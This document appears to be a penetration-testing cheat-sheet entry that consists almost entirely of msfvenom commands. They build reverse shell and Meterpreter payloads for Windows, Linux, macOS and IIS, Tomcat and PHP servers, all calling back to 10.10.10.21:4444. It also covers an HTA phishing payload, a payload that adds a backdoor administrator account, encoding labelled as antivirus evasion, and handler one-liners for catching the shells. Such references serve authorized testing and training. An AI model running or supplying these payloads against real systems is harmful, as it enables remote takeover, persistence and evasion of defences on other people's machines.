---
description: |
  Generate reverse shell payloads with msfvenom for Windows, Linux, macOS, and web applications in various formats (exe, elf, macho, dll, msi, php, python, asp, aspx, war, hta, ps1). All payloads use LHOST=10.10.10.21, LPORT=4444.
command: |
  # Windows Payloads
  # Windows x64 reverse shell (exe):
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f exe -o reverse.exe

  # Windows x64 Meterpreter (exe — staged):
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f exe -o meterpreter.exe

  # Windows x64 Meterpreter stageless (better for unstable connections):
  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f exe -o meterpreter_stageless.exe

  # Windows x64 DLL (for DLL hijacking):
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f dll -o hijack.dll

  # Windows MSI (for AlwaysInstallElevated privesc):
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f msi -o shell.msi

  # Windows exec — add admin user:
  msfvenom -p windows/exec CMD='net user hacker P@ssw0rd /add && net localgroup Administrators hacker /add' -f exe -o addadmin.exe

  # Windows x86 (32-bit) reverse shell:
  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f exe -o reverse32.exe

  # Linux Payloads
  # Linux x64 reverse shell (elf):
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f elf -o reverse.elf

  # Linux x64 Meterpreter (elf):
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f elf -o meterpreter.elf

  # Linux x86 (32-bit):
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f elf -o reverse32.elf

  # macOS Payloads
  # macOS x64 reverse shell:
  msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f macho -o reverse.macho

  # Web Application Payloads
  # PHP reverse shell:
  msfvenom -p php/reverse_php LHOST=10.10.10.21 LPORT=4444 -f raw -o shell.php

  # Python reverse shell:
  msfvenom -p python/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f raw -o shell.py

  # ASP reverse shell (IIS):
  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f asp -o shell.asp

  # ASPX reverse shell (IIS .NET):
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f aspx -o shell.aspx

  # ASPX Meterpreter:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f aspx -o meterpreter.aspx

  # JSP reverse shell (Tomcat):
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f raw -o shell.jsp

  # WAR file (Tomcat deploy):
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f war -o shell.war

  # HTA payload (for phishing / social engineering):
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f hta-psh -o shell.hta

  # Encoder Options (AV Evasion)
  # Encode with shikata_ga_nai (x86 only):
  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

  # List available encoders:
  msfvenom --list encoders

  # Metasploit Handler
  # Start multi/handler to catch the shell:
  msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 10.10.10.21; set LPORT 4444; run"

  # Handler for Meterpreter:
  msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.21; set LPORT 4444; run"

  # Handler for Linux:
  msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 10.10.10.21; set LPORT 4444; run"

  # Quick Reference — Payload Formats
  # Format  | Use Case
  # exe     | Windows executable
  # elf     | Linux executable
  # macho   | macOS executable
  # dll     | DLL hijacking
  # msi     | AlwaysInstallElevated
  # asp     | IIS classic ASP
  # aspx    | IIS .NET
  # jsp     | Tomcat/Java
  # war     | Tomcat deploy
  # php     | PHP web apps
  # py      | Python
  # hta-psh | HTA phishing
  # ps1     | PowerShell script
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
  - macOS
services: []
techniques: []
references:
  - https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
---
